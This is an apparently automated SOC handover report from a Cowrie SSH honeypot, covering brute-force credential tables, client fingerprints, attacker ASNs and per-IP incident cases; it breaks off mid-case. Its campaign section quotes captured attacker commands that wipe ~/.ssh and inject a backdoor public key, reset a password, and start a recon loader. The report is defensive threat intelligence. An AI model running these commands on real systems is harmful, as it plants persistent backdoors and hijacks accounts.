# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-19 |
| **Generated At** | 2026-08-19T14:38:39Z |
| **Shift Time** | 14:38 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **734** |
| Confirmed Threats | **715** |
| False Positives Filtered | **19** (2.6%) |
| Unique Attacker IPs | **85** |
| Countries of Origin | **33** |
| High Severity Cases | **123** |
| Medium Severity Cases | **1** |
| Low Severity Cases | **610** |
| Malware Samples Analyzed | **2** HIGH · **22** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **144** |
| Unique Credential Pairs | **91** |
| Unique Usernames | **19** |
| Unique Passwords | **87** |
| Successful Auth Pairs | **132** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 75 |
| `support` | 14 |
| `default` | 8 |
| `user` | 6 |
| `operator` | 6 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123123` | 7 |
| `user2012` | 6 |
| `root2025` | 6 |
| `support2004` | 6 |
| `operator2016` | 6 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `default` | `123123` | 6 |
| `user` | `user2012` | 6 |
| `root` | `root2025` | 6 |
| `support` | `support2004` | 6 |
| `operator` | `operator2016` | 6 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `default` | `default2008` | `103.83.23.169` | 2026-08-19T10:55:12 |
| `default` | `123123` | `10.0.0.73` | 2026-08-19T10:59:45 |
| `support` | `support2011` | `112.26.101.76` | 2026-08-19T11:00:30 |
| `support` | `support2011` | `65.20.204.88` | 2026-08-19T11:00:39 |
| `root` | `11111111` | `85.158.145.129` | 2026-08-19T11:00:59 |
| `default` | `123123` | `49.124.152.215` | 2026-08-19T11:01:10 |
| `default` | `123123` | `96.1.40.151` | 2026-08-19T11:01:17 |
| `root` | `0019` | `110.173.190.221` | 2026-08-19T11:01:40 |
| `config` | `config1234567890` | `113.140.95.250` | 2026-08-19T11:02:19 |
| `config` | `config1234567890` | `116.114.84.246` | 2026-08-19T11:02:23 |
| `config` | `config1234567890` | `60.166.8.174` | 2026-08-19T11:02:32 |
| `config` | `config1234567890` | `124.67.120.106` | 2026-08-19T11:02:42 |
| `root` | `111111111` | `85.158.145.129` | 2026-08-19T11:06:56 |
| `support` | `support2011` | `10.0.0.73` | 2026-08-19T11:11:55 |
| `root` | `1234q` | `85.158.145.129` | 2026-08-19T11:12:52 |
| `root` | `0020` | `110.173.190.221` | 2026-08-19T11:14:06 |
| `default` | `123123` | `107.135.117.245` | 2026-08-19T11:17:18 |
| `default` | `123123` | `218.58.73.238` | 2026-08-19T11:17:28 |
| `test` | `test2024` | `10.0.0.73` | 2026-08-19T11:17:51 |
| `root` | `12` | `85.158.145.129` | 2026-08-19T11:18:48 |
| `root` | `qazQAZ123!@#` | `80.91.223.114` | 2026-08-19T11:21:58 |
| `345gs5662d34` | `345gs5662d34` | `80.91.223.114` | 2026-08-19T11:22:02 |
| `root` | `3245gs5662d34` | `80.91.223.114` | 2026-08-19T11:22:03 |
| `root` | `123` | `85.158.145.129` | 2026-08-19T11:24:44 |
| `root` | `0021` | `110.173.190.221` | 2026-08-19T11:26:32 |
| `support` | `support2011` | `117.222.2.101` | 2026-08-19T11:28:52 |
| `support` | `support2011` | `60.172.54.36` | 2026-08-19T11:29:03 |
| `root` | `1234` | `85.158.145.129` | 2026-08-19T11:30:41 |
| `user` | `user2012` | `10.0.0.73` | 2026-08-19T11:33:20 |
| `root` | `p@ssw0rd` | `101.96.209.234` | 2026-08-19T11:34:21 |
| `user` | `user2012` | `14.99.61.248` | 2026-08-19T11:34:53 |
| `user` | `user2012` | `182.76.71.82` | 2026-08-19T11:35:03 |
| `test` | `test2024` | `187.49.63.51` | 2026-08-19T11:35:51 |
| `test` | `test2024` | `24.142.170.231` | 2026-08-19T11:35:58 |
| `test` | `test2024` | `109.233.21.109` | 2026-08-19T11:36:07 |
| `test` | `test2024` | `116.228.195.251` | 2026-08-19T11:36:20 |
| `root` | `!@#$12345pass` | `85.158.145.129` | 2026-08-19T11:36:38 |
| `"??$` | `$#7?9>7?>` | `169.211.128.234` | 2026-08-19T11:37:12 |
| `root` | `7ujMko0admin` | `169.211.128.234` | 2026-08-19T11:37:46 |
| `root` | `calvin` | `169.211.128.234` | 2026-08-19T11:38:20 |
| `root` | `123@@@` | `165.1.75.106` | 2026-08-19T11:38:50 |
| `root` | `LeitboGi0ro` | `165.1.75.106` | 2026-08-19T11:38:51 |
| `"??$` | `$1` | `169.211.128.234` | 2026-08-19T11:38:53 |
| `root` | `0022` | `110.173.190.221` | 2026-08-19T11:38:56 |
| `default` | `tlJwpbo6` | `169.211.128.234` | 2026-08-19T11:39:28 |
| `b'\xcc\xd1\xd1\xca'` | `b'\xcc\xd1\xd1\xca\x8f\x8c\x8d'` | `169.211.128.234` | 2026-08-19T11:40:02 |
| `lghkel	` | `zpz}ld	` | `169.211.128.234` | 2026-08-19T11:40:03 |
| `4561%<$` | `4561%<$` | `169.211.128.234` | 2026-08-19T11:40:37 |
| `b'\xcc\xd1\xd1\xca'` | `b'\xca\xd2\x89\x86\x87'` | `169.211.128.234` | 2026-08-19T11:41:11 |
| `root` | `ivdev` | `169.211.128.234` | 2026-08-19T11:41:45 |
| `"??$` | `"51<$5;` | `169.211.128.234` | 2026-08-19T11:42:19 |
| `root` | `!@#$123` | `85.158.145.129` | 2026-08-19T11:42:34 |
| `support` | `support` | `176.53.159.196` | 2026-08-19T11:45:11 |
| `unknown` | `unknown2014` | `10.0.0.73` | 2026-08-19T11:45:25 |
| `root` | `!@#$12` | `85.158.145.129` | 2026-08-19T11:48:30 |
| `user` | `user2012` | `62.183.82.70` | 2026-08-19T11:50:58 |
| `user` | `user2012` | `111.70.23.250` | 2026-08-19T11:51:12 |
| `admin` | `admin2013` | `10.0.0.73` | 2026-08-19T11:51:16 |
| `root` | `0023` | `110.173.190.221` | 2026-08-19T11:51:22 |
| `root` | `!@#$1` | `85.158.145.129` | 2026-08-19T11:54:27 |
| `yusuf` | `yusuf` | `101.96.209.234` | 2026-08-19T11:56:38 |
| `root` | `!@#$12345` | `85.158.145.129` | 2026-08-19T12:00:23 |
| `root` | `111111` | `92.118.39.14` | 2026-08-19T12:01:29 |
| `root` | `123` | `92.118.39.14` | 2026-08-19T12:03:45 |
| `root` | `0024` | `110.173.190.221` | 2026-08-19T12:03:50 |
| `root` | `123123` | `92.118.39.14` | 2026-08-19T12:05:54 |
| `root` | `!@#$123456` | `85.158.145.129` | 2026-08-19T12:06:20 |
| `root` | `123@@@` | `64.110.90.250` | 2026-08-19T12:06:57 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-19T12:06:57 |
| `root` | `root2025` | `10.0.0.73` | 2026-08-19T12:07:16 |
| `support` | `support2004` | `81.237.155.113` | 2026-08-19T12:07:45 |
| `support` | `support2004` | `31.173.8.170` | 2026-08-19T12:07:58 |
| `root` | `123321` | `92.118.39.14` | 2026-08-19T12:08:03 |
| `ayu` | `ayu` | `182.76.43.24` | 2026-08-19T12:08:14 |
| `345gs5662d34` | `345gs5662d34` | `182.76.43.24` | 2026-08-19T12:08:19 |
| `ayu` | `3245gs5662d34` | `182.76.43.24` | 2026-08-19T12:08:21 |
| `root` | `root2025` | `61.143.227.17` | 2026-08-19T12:08:50 |
| `root` | `root2025` | `59.48.40.6` | 2026-08-19T12:09:00 |
| `support` | `support` | `10.0.0.73` | 2026-08-19T12:10:05 |
| `root` | `1234` | `92.118.39.14` | 2026-08-19T12:10:14 |
| `root` | `admin123` | `85.158.145.129` | 2026-08-19T12:12:16 |
| `root` | `12345` | `92.118.39.14` | 2026-08-19T12:12:18 |
| `root` | `1234567` | `92.118.39.14` | 2026-08-19T12:16:20 |
| `root` | `0025` | `110.173.190.221` | 2026-08-19T12:16:22 |
| `root` | `admin1` | `85.158.145.129` | 2026-08-19T12:18:13 |
| `root` | `12345678` | `92.118.39.14` | 2026-08-19T12:18:21 |
| `support` | `support2004` | `10.0.0.73` | 2026-08-19T12:19:17 |
| `root` | `123456789` | `92.118.39.14` | 2026-08-19T12:20:39 |
| `admin` | `admin` | `209.99.190.174` | 2026-08-19T12:20:40 |
| `root` | `1234abcd` | `92.118.39.14` | 2026-08-19T12:22:45 |
| `root` | `admin12` | `85.158.145.129` | 2026-08-19T12:24:09 |
| `operator` | `operator2016` | `10.0.0.73` | 2026-08-19T12:24:47 |
| `root` | `root2025` | `45.178.227.0` | 2026-08-19T12:24:52 |
| `root` | `123abc` | `92.118.39.14` | 2026-08-19T12:24:52 |
| `root` | `root2025` | `219.144.16.16` | 2026-08-19T12:25:03 |
| `root` | `123qwe` | `92.118.39.14` | 2026-08-19T12:26:59 |
| `root` | `yz.123456` | `96.78.175.36` | 2026-08-19T12:27:10 |
| `345gs5662d34` | `345gs5662d34` | `96.78.175.36` | 2026-08-19T12:27:12 |
| `root` | `3245gs5662d34` | `96.78.175.36` | 2026-08-19T12:27:13 |
| `lzy` | `lzy123` | `103.183.62.3` | 2026-08-19T12:27:33 |
| `345gs5662d34` | `345gs5662d34` | `103.183.62.3` | 2026-08-19T12:27:38 |
| `lzy` | `3245gs5662d34` | `103.183.62.0` | 2026-08-19T12:27:40 |
| `root` | `0026` | `110.173.190.221` | 2026-08-19T12:28:55 |
| `root` | `1q2w3e` | `92.118.39.14` | 2026-08-19T12:29:15 |
| `root` | `admin1234` | `85.158.145.129` | 2026-08-19T12:30:05 |
| `root` | `1q2w3e4r` | `92.118.39.14` | 2026-08-19T12:31:22 |
| `root` | `1qaz2wsx` | `92.118.39.14` | 2026-08-19T12:33:25 |
| `root` | `654321` | `92.118.39.14` | 2026-08-19T12:35:30 |
| `root` | `admin12345` | `85.158.145.129` | 2026-08-19T12:36:01 |
| `support` | `support2004` | `208.109.38.143` | 2026-08-19T12:36:18 |
| `support` | `support2004` | `119.160.166.237` | 2026-08-19T12:36:27 |
| `root` | `P@ssw0rd` | `92.118.39.14` | 2026-08-19T12:37:37 |
| `root` | `P@ssword` | `92.118.39.14` | 2026-08-19T12:39:49 |
| `root` | `0027` | `110.173.190.221` | 2026-08-19T12:41:25 |
| `unknown` | `unknown2000` | `103.120.116.162` | 2026-08-19T12:41:35 |
| `unknown` | `unknown2000` | `106.245.246.26` | 2026-08-19T12:41:49 |
| `root` | `admin123456` | `85.158.145.129` | 2026-08-19T12:41:57 |
| `root` | `Root123` | `92.118.39.14` | 2026-08-19T12:42:16 |
| `debian` | `debian2001` | `202.82.20.241` | 2026-08-19T12:42:38 |
| `operator` | `operator2016` | `211.228.114.53` | 2026-08-19T12:43:02 |
| `operator` | `operator2016` | `2.55.125.200` | 2026-08-19T12:43:10 |
| `operator` | `operator2016` | `223.241.214.127` | 2026-08-19T12:43:16 |
| `operator` | `operator2016` | `111.70.11.78` | 2026-08-19T12:43:27 |
| `root` | `admin` | `92.118.39.14` | 2026-08-19T12:44:46 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `194.164.107.6` | 2026-08-19T12:46:57 |
| `root` | `admin123` | `92.118.39.14` | 2026-08-19T12:47:12 |
| `root` | `admin1234567` | `85.158.145.129` | 2026-08-19T12:47:53 |
| `root` | `letmein` | `92.118.39.14` | 2026-08-19T12:49:31 |
| `root` | `passw0rd` | `92.118.39.14` | 2026-08-19T12:51:34 |
| `root` | `password` | `92.118.39.14` | 2026-08-19T12:53:44 |
| `root` | `admin12345678` | `85.158.145.129` | 2026-08-19T12:53:49 |
| `root` | `0028` | `110.173.190.221` | 2026-08-19T12:53:53 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **734** |
| Sessions with Fingerprint | **10** |
| Unique HASSH Fingerprints | **10** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 58 |
| OpenSSH | 37 |
| libssh | 30 |
| Paramiko (Python) | 6 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 37 | 37 |
| `2ec37a7cc8da...` | Mirai/variant | 25 | 1 |
| `98f63c4d9c87...` | Generic scanner | 20 | 1 |
| `f555226df196...` | Mirai/variant | 20 | 6 |
| `98ddc5604ef6...` | Modern SSH client | 10 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 37 | 37 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 25 | 1 | Mirai/variant |
| `98f63c4d9c87...` | Go SSH scanner | 20 | 1 | Generic scanner |
| `f555226df196...` | libssh | 20 | 6 | Mirai/variant |
| `95420f9d932d...` | libssh | 10 | 6 | — |
| `98ddc5604ef6...` | Go SSH scanner | 10 | 1 | Modern SSH client |
| `a2de0f306611...` | Paramiko (Python) | 6 | 2 | Mirai/variant |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **10** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **Recon Loader Script** | 🟡 MEDIUM | 24 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo -e "yusuf\nKOQzaQShmBkH\nKOQzaQShmBkH"|passwd|bash
```
```
Enter new UNIX password:
```
Source IPs: `101.96.209.234`

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `92.118.39.14`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `96.78.175.36`, `80.91.223.114`, `182.76.43.24`, `103.183.62.3`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **85** |
| Unique ASNs | **64** |
| High-Risk ASNs | **53** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 7 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 3 | HIGH |
| `AS9498` | BHARTI Airtel Ltd. | 3 | HIGH |
| `AS12552` | GlobalConnect AB | 3 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 2 | HIGH |
| `AS4818` | DiGi Telecommunications Sdn. Bhd. | 2 | HIGH |
| `AS149636` | Hasan Broadband Net | 2 | HIGH |
| `AS4766` | Korea Telecom | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (124)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-b03a476230a9

| Field | Detail |
|---|---|
| **Source IP** | `103.83.23[.]169` |
| **First Seen** | 2026-08-19 10:55 |
| **Last Seen** | 2026-08-19 10:55 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 10:55:10` | `cowrie.session.connect` |
| `2026-08-19 10:55:10` | `cowrie.client.version` |
| `2026-08-19 10:55:10` | `cowrie.client.kex` |
| `2026-08-19 10:55:12` | `cowrie.login.success` |
| `2026-08-19 10:55:12` | `cowrie.direct-tcpip.request` |
| `2026-08-19 10:55:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.83.23[.]169` to AbuseIPDB if not already reported
- [ ] Block `103.83.23[.]169` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5464708f4369

| Field | Detail |
|---|---|
| **Source IP** | `112.26.101[.]76` |
| **First Seen** | 2026-08-19 11:00 |
| **Last Seen** | 2026-08-19 11:00 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 11:00:26` | `cowrie.session.connect` |
| `2026-08-19 11:00:27` | `cowrie.client.version` |
| `2026-08-19 11:00:27` | `cowrie.client.kex` |
| `2026-08-19 11:00:30` | `cowrie.login.success` |
| `2026-08-19 11:00:31` | `cowrie.direct-tcpip.request` |
| `2026-08-19 11:00:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.26.101[.]76` to AbuseIPDB if not already reported
- [ ] Block `112.26.101[.]76` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-701deb1f9886

| Field | Detail |
|---|---|
| **Source IP** | `65.20.204[.]88` |
| **First Seen** | 2026-08-19 11:00 |
| **Last Seen** | 2026-08-19 11:00 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 11:00:38` | `cowrie.session.connect` |
| `2026-08-19 11:00:38` | `cowrie.client.version` |
| `2026-08-19 11:00:38` | `cowrie.client.kex` |
| `2026-08-19 11:00:39` | `cowrie.login.success` |
| `2026-08-19 11:00:40` | `cowrie.direct-tcpip.request` |
| `2026-08-19 11:00:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.204[.]88` to AbuseIPDB if not already reported
- [ ] Block `65.20.204[.]88` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db35b894987f

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 11:00 |
| **Last Seen** | 2026-08-19 11:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 11:00:59` | `cowrie.session.connect` |
| `2026-08-19 11:00:59` | `cowrie.client.version` |
| `2026-08-19 11:00:59` | `cowrie.client.kex` |
| `2026-08-19 11:00:59` | `cowrie.login.success` |
| `2026-08-19 11:01:00` | `cowrie.session.params` |
| `2026-08-19 11:01:00` | `cowrie.command.input` |
| `2026-08-19 11:01:00` | `cowrie.log.closed` |
| `2026-08-19 11:01:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-821e740e8d04

| Field | Detail |
|---|---|
| **Source IP** | `49.124.152[.]215` |
| **First Seen** | 2026-08-19 11:01 |
| **Last Seen** | 2026-08-19 11:01 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 11:01:06` | `cowrie.session.connect` |
| `2026-08-19 11:01:07` | `cowrie.client.version` |
| `2026-08-19 11:01:07` | `cowrie.client.kex` |
| `2026-08-19 11:01:10` | `cowrie.login.success` |
| `2026-08-19 11:01:11` | `cowrie.direct-tcpip.request` |
| `2026-08-19 11:01:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.152[.]215` to AbuseIPDB if not already reported
- [ ] Block `49.124.152[.]215` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59871058084a

| Field | Detail |
|---|---|
| **Source IP** | `96.1.40[.]151` |
| **First Seen** | 2026-08-19 11:01 |
| **Last Seen** | 2026-08-19 11:01 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 11:01:16` | `cowrie.session.connect` |
| `2026-08-19 11:01:16` | `cowrie.client.version` |
| `2026-08-19 11:01:16` | `cowrie.client.kex` |
| `2026-08-19 11:01:17` | `cowrie.login.success` |
| `2026-08-19 11:01:18` | `cowrie.direct-tcpip.request` |
| `2026-08-19 11:01:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `96.1.40[.]151` to AbuseIPDB if not already reported
- [ ] Block `96.1.40[.]151` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a12ccbbed55

| Field | Detail |
|---|---|
| **Source IP** | `110.173.190[.]221` |
| **First Seen** | 2026-08-19 11:01 |
| **Last Seen** | 2026-08-19 11:01 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 11:01:32` | `cowrie.session.connect` |
| `2026-08-19 11:01:33` | `cowrie.client.version` |
| `2026-08-19 11:01:33` | `cowrie.client.kex` |
| `2026-08-19 11:01:40` | `cowrie.login.success` |
| `2026-08-19 11:01:44` | `cowrie.session.params` |
| `2026-08-19 11:01:44` | `cowrie.command.input` |
| `2026-08-19 11:01:45` | `cowrie.log.closed` |
| `2026-08-19 11:01:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.173.190[.]221` to AbuseIPDB if not already reported
- [ ] Block `110.173.190[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f89146922ff

| Field | Detail |
|---|---|
| **Source IP** | `113.140.95[.]250` |
| **First Seen** | 2026-08-19 11:02 |
| **Last Seen** | 2026-08-19 11:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 11:02:16` | `cowrie.session.connect` |
| `2026-08-19 11:02:17` | `cowrie.client.version` |
| `2026-08-19 11:02:17` | `cowrie.client.kex` |
| `2026-08-19 11:02:19` | `cowrie.login.success` |
| `2026-08-19 11:02:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.140.95[.]250` to AbuseIPDB if not already reported
- [ ] Block `113.140.95[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92d64dfb4e33

| Field | Detail |
|---|---|
| **Source IP** | `116.114.84[.]246` |
| **First Seen** | 2026-08-19 11:02 |
| **Last Seen** | 2026-08-19 11:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 11:02:21` | `cowrie.session.connect` |
| `2026-08-19 11:02:21` | `cowrie.client.version` |
| `2026-08-19 11:02:21` | `cowrie.client.kex` |
| `2026-08-19 11:02:23` | `cowrie.login.success` |
| `2026-08-19 11:02:24` | `cowrie.direct-tcpip.request` |
| `2026-08-19 11:02:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.114.84[.]246` to AbuseIPDB if not already reported
- [ ] Block `116.114.84[.]246` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7833a44b593d

| Field | Detail |
|---|---|
| **Source IP** | `60.166.8[.]174` |
| **First Seen** | 2026-08-19 11:02 |
| **Last Seen** | 2026-08-19 11:02 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 11:02:29` | `cowrie.session.connect` |
| `2026-08-19 11:02:30` | `cowrie.client.version` |
| `2026-08-19 11:02:30` | `cowrie.client.kex` |
| `2026-08-19 11:02:32` | `cowrie.login.success` |
| `2026-08-19 11:02:33` | `cowrie.direct-tcpip.request` |
| `2026-08-19 11:02:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.166.8[.]174` to AbuseIPDB if not already reported
- [ ] Block `60.166.8[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39d6df632091

| Field | Detail |
|---|---|
| **Source IP** | `124.67.120[.]106` |
| **First Seen** | 2026-08-19 11:02 |
